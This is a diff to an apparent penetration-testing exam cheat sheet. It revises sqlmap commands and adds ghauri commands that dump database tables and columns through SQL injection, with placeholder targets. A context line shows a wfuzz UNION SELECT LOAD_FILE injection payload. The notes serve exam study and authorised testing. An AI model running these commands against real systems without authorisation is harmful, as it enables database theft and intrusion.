@@ -134,15 +134,30 @@ wfuzz -z file,/tmp/file_inclusion_linux.txt -d "username=' UNION SELECT 1, LOAD_
 
 ### :no_entry: sqlmap (:radioactive::radioactive::radioactive: cannot be used in the exam)
 
-```
-sqlmap -u "url" --dump -C "columns" -T "tables" -D "database" --random-agent 
-sqlmap -r post.txt -p "parameter_name" --dump -C "columns" -T "tables" -D "database" --random-agent
+```shell
+# GET
+sqlmap -u "<target url>" --dump -C "columns" -T "tables" -D "database" --random-agent 
+# GET, POST
+sqlmap -r "<request.txt>" -p "<parameter1>,<parameter2>" --dump -C "columns" -T "tables" -D "database" --random-agent
+sqlmap -u "<target url>" -p "<parameter1>,<parameter2>" --dump -C "columns" -T "tables" -D "database" --random-agent --data "<data body>"
 ```
 
 post.txt = request contents
 
 ![SQLi_2022 02 28_19h37m55s_001](https://user-images.githubusercontent.com/8998412/155977929-7e38d3bb-8d61-4afa-af6b-90ae1e13ec73.png)
 
+
+### :no_entry: ghauri (:radioactive::radioactive::radioactive: cannot be used in the exam)
+
+You can always give it a try.
+
+```shell
+# GET
+ghauri -u "<target url>" --confirm --level 3 --flush-session -p '<parameter1>,<parameter2>'
+# GET, POST
+ghauri -r "<request.txt>" --confirm --level 3 --flush-session -p '<parameter1>,<parameter2>' 
+ghauri -u "<target url>" --confirm --level 3 --flush-session -p '<parameter1>,<parameter2>' --data "<data body>"
+```
 
 ### :no_entry: MS SQL
 
